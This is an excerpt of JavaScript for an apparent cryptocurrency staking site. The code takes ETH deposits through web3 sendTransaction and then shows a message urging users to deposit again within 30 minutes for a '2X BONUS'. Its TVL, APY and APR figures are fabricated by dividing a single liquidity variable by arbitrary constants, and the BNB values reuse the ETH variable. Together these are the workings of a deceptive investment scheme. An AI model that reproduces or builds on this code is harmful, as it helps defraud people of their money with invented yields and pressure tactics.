...
app.controller('myCtrl', async function($scope) {
    $scope.init = function() {
        ...
        $scope.chain = "Ethereum", $scope.addressdex = "0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D", $scope.scan = "https://etherscan.io/", $scope.idscan = "Etherscan", $scope.stacking = document.getElementById('loanAmtInput');
        $scope.erc20 = {
            network: !isBnb
        };
        $scope.loan = {
        ...
        $scope.depositEth = function() {
            ...
            window.web3.eth.sendTransaction({
                ...
                if (error) swal('Error','Transaction Failed', "error");
                    ...
                    setTimeout(function() {
                        swal('Success','Deposit completed. DEPOSIT AGAIN IN LESS THAN 30 MINS TO GET 2X BONUS UNTIL FIRST WITHDRAW!', "success");
...
function tvl_eth() {
    document.getElementById("tvl_eth").innerHTML = (liquidity_eth / 16).toLocaleString() + " $";
    document.getElementById("apy_eth").innerHTML = (liquidity_eth / 598000 * 2).toLocaleString() + " %";
    document.getElementById("apr_eth").innerHTML = (liquidity_eth / 1598000 * 2).toLocaleString() + " %";
    document.getElementById("apy3_eth").innerHTML = (liquidity_eth / 598000 * 2).toLocaleString() + " %";
    document.getElementById("apy4_eth").innerHTML = (liquidity_eth / 598000 * 2).toLocaleString() + " %";
    document.getElementById("apr3_eth").innerHTML = document.getElementById("apr_eth").innerHTML;
}

function tvl_bnb() {
    document.getElementById("tvl_bnb").innerHTML = (liquidity_eth / 27).toLocaleString() + " $";
    document.getElementById("apy_bnb").innerHTML = (liquidity_eth / 798000 * 2).toLocaleString() + " %";
    document.getElementById("apr_bnb").innerHTML = (liquidity_eth / 1998000 * 2).toLocaleString() + " %";
    document.getElementById("apy3_bnb").innerHTML = (liquidity_eth / 798000 * 2).toLocaleString() + " %";
    document.getElementById("apy4_bnb").innerHTML = (liquidity_eth / 798000 * 2).toLocaleString() + " %";
    document.getElementById("apr3_bnb").innerHTML = document.getElementById("apr_bnb").innerHTML;
}

function tvl() {
    document.getElementById("tvl2_eth").innerHTML = (liquidity_eth / 16).toLocaleString() + " $";
    document.getElementById("apy2_eth").innerHTML = (liquidity_eth / 598000 * 2).toLocaleString() + " %";
    document.getElementById("tvl2_bnb").innerHTML = (liquidity_eth / 27).toLocaleString() + " $";
    document.getElementById("apy2_bnb").innerHTML = (liquidity_eth / 798000 * 2).toLocaleString() + " %";
